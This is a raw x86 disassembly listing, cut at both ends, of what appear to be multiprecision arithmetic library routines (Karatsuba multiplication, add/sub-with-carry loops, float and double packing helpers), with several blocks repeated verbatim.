mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808cca0
mov eax, dword [arg_14h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808cf2b
dec ebx
je 0x808cca0
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf2b
dec ebx
jne 0x808cf14
jmp 0x808cca0
cmp ecx, esi
je 0x808cca0
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808cca0
mov esi, esi
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf40
jmp 0x808cca0
cmp ecx, edi
je 0x808ceb0
mov ebx, dword [var_14h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808ceb0
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf66
jmp 0x808ceb0
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_ch]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808ce4f
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
jmp 0x808ce29
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [edx + esi*4]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808cdb6
mov eax, dword [arg_8h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
add eax, edi
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.0808d570
jmp 0x808cd90
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.0808d570
mov dword [var_bp_10h], 1
jmp 0x808cd4a
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [esi*4]
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cd0b
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edx, dword [arg_ch]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808d130
je 0x808d119
xor eax, eax
cmp eax, edi
jge 0x808d0b1
mov dword [ebx + eax*4], 0
inc eax
cmp eax, edi
jl 0x808d0a5
xor eax, eax
mov esi, 1
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jge 0x808d0df
mov edx, dword [arg_ch]
mov eax, dword [edx + esi*4]
cmp eax, 1
ja 0x808d100
mov eax, 0
je 0x808d0e7
inc esi
mov dword [ebx + edi*4], eax
add ebx, 4
cmp esi, edi
jl 0x808d0c2
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edi
mov dword [var_8h], edx
mov dword [var_4h], ebx
mov dword [esp], ebx
call fcn.0808c2a0
jmp 0x808d0d4
lea esi, [esi]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808d0d4
xor edx, edx
cmp edx, edi
jge 0x808d0b1
nop
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, edi
jl 0x808d120
jmp 0x808d0b1
mov dword [var_ch], eax
mov dword [var_8h], edi
mov dword [esp], ebx
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.0808cae0
jmp 0x808d0b3
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_10h], 1
mov edi, dword [arg_ch]
je 0x808d1f1
mov esi, dword [arg_10h]
dec esi
cmp esi, 0x1f
jg 0x808d1d5
mov eax, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], eax
call fcn.0808d080
mov eax, dword [edi + esi*4]
mov dword [var_4h], edi
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov eax, dword [edi + esi*4]
mov dword [esp], ebx
mov dword [var_4h], edi
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
call fcn.08090d80
mov ecx, dword [arg_10h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [arg_14h]
mov ecx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [esp], ecx
call fcn.0808d150
jmp 0x808d182
mov esi, dword [arg_10h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d494
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
lea eax, [edi + esi*4]
mov dword [var_4h], eax
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d080
lea ebx, [edi + esi*4]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d47d
mov eax, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], edi
mov dword [var_4h], ebx
mov dword [esp], eax
call fcn.0808d570
cmp esi, 0x1f
jg 0x808d458
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808d080
test esi, esi
jle 0x808d28d
mov edx, dword [arg_8h]
mov eax, dword [arg_10h]
lea ebx, [edx + esi*4]
lea ecx, [edx + eax*4]
mov edx, esi
mov esi, esi
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808d280
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, esi
lea eax, [ecx + edx*4]
mov dword [var_10h], edx
mov dword [var_8h], eax
mov eax, dword [arg_10h]
shl eax, 2
mov dword [var_14h], eax
mov eax, ecx
add eax, dword [var_14h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov ebx, eax
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808d436
mov ecx, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov dword [esp], ecx
call fcn.0808d080
mov edx, dword [arg_10h]
mov ecx, dword [arg_14h]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov edx, dword [arg_8h]
lea eax, [edx + esi*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808d368
mov eax, dword [var_10h]
mov edx, dword [arg_8h]
mov dword [var_18h], esi
lea ecx, [edx + eax*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808d410
mov eax, esi
dec eax
mov dword [var_18h], eax
je 0x808d368
lea esi, [esi]
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d410
dec dword [var_18h]
jne 0x808d350
xor edx, edx
cmp edx, esi
jge 0x808d381
mov esi, esi
mov ecx, dword [arg_14h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808d370
mov edx, dword [arg_14h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808d1cd
mov eax, dword [arg_10h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808d3e7
dec ebx
je 0x808d1cd
mov esi, esi
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808d3e7
dec ebx
jne 0x808d3d0
jmp 0x808d1cd
cmp ecx, esi
je 0x808d1cd
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d1cd
lea esi, [esi]
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d400
jmp 0x808d1cd
cmp ecx, edi
je 0x808d368
mov ebx, dword [var_18h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808d368
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808d426
jmp 0x808d368
mov eax, dword [arg_14h]
mov dword [var_8h], esi
mov dword [var_4h], edi
add eax, dword [var_14h]
mov dword [var_ch], eax
mov eax, dword [arg_14h]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d2fd
mov ecx, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov dword [var_ch], eax
mov eax, dword [arg_8h]
mov dword [var_4h], eax
call fcn.0808d150
jmp 0x808d26c
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], edi
mov dword [esp], edx
jmp 0x808d248
mov eax, dword [arg_14h]
mov edx, dword [arg_10h]
mov dword [var_8h], esi
mov ecx, dword [arg_8h]
mov dword [var_ch], eax
lea eax, [edi + esi*4]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808d150
jmp 0x808d21b
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_8h], ebx
mov ecx, dword [arg_10h]
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov edx, dword [arg_14h]
mov esi, dword [arg_8h]
cmp ebx, ecx
je 0x808d52a
cmp edx, 0x1f
jg 0x808d500
mov dword [var_ch], edx
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808cb40
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea esi, [esi]
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_ch], edx
mov dword [var_sp_8h], ecx
and eax, 0xfffffff0
mov dword [var_sp_4h], ebx
mov dword [esp], esi
mov dword [var_10h], eax
call fcn.0808cc10
jmp 0x808d4f5
cmp edx, 0x1f
jg 0x808d541
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
mov dword [esp], esi
call fcn.0808d080
jmp 0x808d4f5
lea eax, [edx*8 + 0x10]
sub esp, eax
lea eax, [arg_23h]
mov dword [var_sp_8h], edx
mov dword [var_sp_4h], ebx
and eax, 0xfffffff0
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0808d150
jmp 0x808d4f5
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808d5a8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808d5a5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
sbb eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
sbb eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
sbb eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
sbb eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
sbb eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
sbb eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
sbb eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
sbb eax, dword [edx + 0x1c]
mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808d5a8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
adc edx, 0
sub dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808d620
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov eax, dword [arg_14h]
mov ecx, dword [arg_18h]
push ebx
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
mov ebx, dword [arg_1ch]
mov dword [edi], ecx
mov edx, ebx
shr edx, 0x1f
mov dword [eax], edx
mov edx, ebx
shr edx, 0x14
and edx, 0x7ff
lea eax, [edx - 0x3ff]
mov dword [esi], eax
mov esi, ebx
and esi, 0xfffff
test edx, edx
mov dword [edi + 4], esi
jne 0x808d71b
test ecx, ecx
jne 0x808d69f
test esi, esi
jne 0x808d69f
mov eax, dword [arg_10h]
mov dword [eax], 0
pop ebx
pop esi
pop edi
mov eax, 2
leave
ret
mov esi, dword [edi + 4]
test esi, esi
je 0x808d6d9
bsr ebx, esi
mov edx, dword [edi]
xor ebx, 0x1f
sub ebx, 0xb
mov ecx, ebx
shl esi, cl
mov eax, edx
mov ecx, 0x20
sub ecx, ebx
shr eax, cl
mov ecx, ebx
or esi, eax
shl edx, cl
mov eax, 0xfffffc02
mov dword [edi + 4], esi
sub eax, ebx
mov dword [edi], edx
mov esi, dword [arg_10h]
mov dword [esi], eax
jmp 0x808d695
bsr ebx, dword [edi]
xor ebx, 0x1f
cmp ebx, 0xa
jle 0x808d702
mov eax, dword [edi]
lea ecx, [ebx - 0xb]
mov dword [edi], 0
shl eax, cl
mov dword [edi + 4], eax
mov edx, dword [arg_10h]
mov eax, 0xfffffbed
sub eax, ebx
mov dword [edx], eax
jmp 0x808d695
mov edx, dword [edi]
mov ecx, 0xb
sub ecx, ebx
mov eax, edx
shr eax, cl
lea ecx, [ebx + 0x15]
shl edx, cl
mov dword [edi + 4], eax
mov dword [edi], edx
jmp 0x808d6f4
or esi, 0x100000
mov dword [edi + 4], esi
jmp 0x808d695
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov ecx, dword [arg_20h]
mov edx, dword [arg_1ch]
mov eax, dword [arg_18h]
mov esi, dword [arg_8h]
mov dword [var_14h], ecx
mov dword [var_18h], edx
mov ecx, dword [arg_10h]
mov dword [var_1ch], eax
mov edx, dword [arg_14h]
movzx eax, byte [var_13h]
shr al, 7
movzx eax, al
mov dword [edx], eax
movzx edx, word [var_14h]
and edx, 0x7fff
lea eax, [edx - 0x3fff]
test edx, edx
mov dword [ecx], eax
mov eax, dword [var_1ch]
mov dword [esi], eax
mov ecx, dword [var_18h]
mov dword [esi + 4], ecx
jne 0x808d7a2
test eax, eax
jne 0x808d7af
test ecx, ecx
jne 0x808d7af
mov eax, dword [arg_10h]
mov dword [eax], 0
add esp, 0x10
mov eax, 2
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [esi + 4]
and ebx, 0x7fffffff
test ebx, ebx
mov dword [esi + 4], ebx
je 0x808d7f3
bsr eax, ebx
mov edi, eax
xor edi, 0x1f
je 0x808d7e5
mov edx, dword [esi]
mov ecx, edi
shl ebx, cl
mov ecx, 0x20
sub ecx, edi
mov eax, edx
shr eax, cl
mov ecx, edi
or ebx, eax
shl edx, cl
mov dword [esi + 4], ebx
mov dword [esi], edx
mov eax, 0xffffc002
mov edx, dword [arg_10h]
sub eax, edi
mov dword [edx], eax
jmp 0x808d7a2
mov eax, dword [esi]
test eax, eax
je 0x808d813
bsr edi, eax
mov dword [esi], 0
xor edi, 0x1f
mov ecx, edi
shl eax, cl
mov dword [esi + 4], eax
mov eax, 0xffffbfe2
jmp 0x808d7ea
mov ecx, dword [arg_10h]
mov dword [esi + 4], 0x80000000
mov dword [ecx], 0xffffc002
jmp 0x808d7a2
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
and edx, 0x7fffffff
mov ebp, esp
sub esp, 4
mov eax, dword [arg_10h]
shl eax, 0x1f
or edx, eax
mov eax, dword [arg_ch]
and edx, 0x807fffff
add eax, 0x7f
and eax, 0xff
shl eax, 0x17
or edx, eax
mov eax, dword [arg_8h]
and edx, 0xff800000
mov eax, dword [eax]
and eax, 0x7fffff
or edx, eax
mov dword [var_4h], edx
fld dword [ebp - 4]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov ecx, dword [arg_10h]
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
mov edx, ecx
shl edx, 0x1f
add ebx, 0x3ff
mov eax, dword [esi]
mov ecx, edx
and ebx, 0x7ff
and ecx, 0x800fffff
shl ebx, 0x14
mov edx, ecx
or edx, ebx
mov ebx, dword [esi + 4]
mov esi, dword [var_4h]
mov ecx, edx
mov dword [var_10h], eax
and ecx, 0xfff00000
and ebx, 0xfffff
mov edx, ecx
or edx, ebx
mov ebx, dword [var_8h]
mov dword [var_ch], edx
fld qword [ebp - 0x10]
leave
ret
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
movzx eax, byte [var_7h]
mov edx, dword [arg_10h]
mov ecx, dword [arg_8h]
shl edx, 7
and eax, 0x7f
or eax, edx
mov edx, dword [arg_ch]
mov byte [var_7h], al
mov eax, dword [var_8h]
add edx, 0x3fff
and dx, 0x7fff
and ax, 0x8000
or eax, edx
mov word [var_8h], ax
mov eax, dword [ecx]
mov dword [var_10h], eax
mov eax, dword [ecx + 4]
mov dword [var_ch], eax
fld xword [ebp - 0x10]
leave
ret
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808d5a8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808d5a5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
sbb eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
sbb eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
sbb eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
sbb eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
sbb eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
sbb eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
sbb eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
sbb eax, dword [edx + 0x1c]
mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808d5a8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
adc edx, 0
add dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x8090da0
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
test byte [arg_14h], 1
je 0x808ccd1
mov esi, dword [arg_14h]
dec esi
cmp esi, 0x1f
jg 0x808cca8
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov eax, dword [edx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], esi
mov dword [var_ch], eax
mov eax, dword [arg_8h]
lea ebx, [eax + esi*4]
mov dword [esp], ebx
call fcn.08090d80
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [ecx + esi*8], eax
mov ecx, dword [arg_14h]
mov eax, dword [edx + esi*4]
mov dword [esp], ebx
mov dword [var_ch], eax
mov dword [var_8h], ecx
mov eax, dword [arg_10h]
mov dword [var_4h], eax
call fcn.08090d80
mov ecx, dword [arg_14h]
mov edx, eax
lea eax, [ecx + esi]
mov ecx, dword [arg_8h]
mov dword [ecx + eax*4], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_ch]
mov dword [var_10h], eax
mov dword [var_8h], edx
mov eax, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cc49
mov esi, dword [arg_14h]
sar esi, 1
cmp esi, 0x1f
jg 0x808d03c
mov edx, dword [arg_10h]
lea eax, [esi*4]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cb40
mov eax, dword [arg_ch]
mov dword [var_8h], esi
lea ebx, [eax + esi*4]
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808d016
mov edx, dword [arg_ch]
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.0808d570
mov dword [var_bp_10h], 0
mov ecx, dword [arg_10h]
lea edi, [esi*4]
mov dword [var_8h], esi
mov ebx, ecx
mov dword [var_4h], ecx
add ebx, edi
mov dword [esp], ebx
call fcn.0808c330
test eax, eax
js 0x808cff5
mov eax, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_4h], ebx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
add eax, edi
mov dword [esp], eax
call fcn.0808d570
xor dword [var_bp_10h], 1
cmp esi, 0x1f
jg 0x808cfc9
mov ecx, dword [arg_8h]
mov dword [var_ch], esi
lea eax, [ecx + esi*4]
mov dword [var_4h], ecx
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [esp], eax
call fcn.0808cb40
test esi, esi
jle 0x808cdd5
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov edx, esi
lea ebx, [ecx + esi*4]
lea ecx, [ecx + eax*4]
mov eax, dword [ecx]
add ecx, 4
mov dword [ebx], eax
add ebx, 4
dec edx
jne 0x808cdc8
mov edi, dword [arg_14h]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov ecx, dword [arg_14h]
add edi, esi
lea eax, [edx + edi*4]
mov dword [var_8h], eax
lea eax, [edx + ecx*4]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
mov ebx, eax
mov eax, dword [var_bp_10h]
test eax, eax
je 0x808cfa2
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808d570
sub ebx, eax
cmp esi, 0x1f
jg 0x808cf76
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_ch], esi
mov ecx, dword [arg_18h]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cb40
mov eax, dword [arg_18h]
mov edx, dword [arg_8h]
mov ecx, dword [arg_14h]
mov dword [var_8h], eax
lea eax, [edx + esi*4]
mov dword [var_ch], ecx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
je 0x808ceb0
mov eax, dword [arg_8h]
mov dword [var_14h], esi
lea ecx, [eax + edi*4]
mov edx, dword [ecx]
lea edi, [ecx + 4]
lea eax, [edx + ebx]
cmp eax, edx
mov dword [ecx], eax
mov ecx, edi
jae 0x808cf50
mov edx, esi
dec edx
mov dword [var_14h], edx
je 0x808ceb0
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf50
dec dword [var_14h]
jne 0x808ce98
xor edx, edx
cmp edx, esi
jge 0x808cec7
mov ecx, dword [arg_18h]
mov eax, dword [ecx + edx*4]
mov ecx, dword [arg_8h]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ceb6
mov edx, dword [arg_18h]
lea eax, [esi*4]
mov dword [var_ch], esi
add edx, eax
add eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
test eax, eax
je 0x808cca0
mov eax, dword [arg_14h]
mov edx, dword [arg_8h]
lea ecx, [edx + eax*4]
mov ebx, eax
mov edx, dword [ecx]
lea esi, [ecx + 4]
lea eax, [edx + 1]
cmp eax, edx
mov dword [ecx], eax
mov ecx, esi
jae 0x808cf2b
dec ebx
je 0x808cca0
mov edx, dword [esi]
add esi, 4
inc edx
mov dword [ecx], edx
add ecx, 4
test edx, edx
jne 0x808cf2b
dec ebx
jne 0x808cf14
jmp 0x808cca0
cmp ecx, esi
je 0x808cca0
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808cca0
mov esi, esi
mov eax, dword [esi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf40
jmp 0x808cca0
cmp ecx, edi
je 0x808ceb0
mov ebx, dword [var_14h]
xor edx, edx
dec ebx
cmp edx, ebx
jge 0x808ceb0
mov eax, dword [edi + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, ebx
jl 0x808cf66
jmp 0x808ceb0
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_ch]
mov dword [var_10h], eax
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808ce4f
mov eax, dword [arg_14h]
mov ecx, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [var_ch], eax
lea eax, [ecx + esi*4]
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808c2a0
add ebx, eax
jmp 0x808ce29
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
lea eax, [ecx + edx*4]
mov dword [esp], ecx
mov edx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [edx + esi*4]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cc10
jmp 0x808cdb6
mov eax, dword [arg_8h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
add eax, edi
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.0808d570
jmp 0x808cd90
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
mov dword [var_ch], esi
mov dword [var_8h], ebx
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.0808d570
mov dword [var_bp_10h], 1
jmp 0x808cd4a
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov dword [var_ch], esi
mov ecx, dword [arg_8h]
mov dword [var_10h], eax
lea eax, [esi*4]
add edx, eax
add eax, dword [arg_ch]
mov dword [var_8h], edx
mov edx, dword [arg_14h]
mov dword [var_4h], eax
lea eax, [ecx + edx*4]
mov dword [esp], eax
call fcn.0808cc10
jmp 0x808cd0b
push ebp
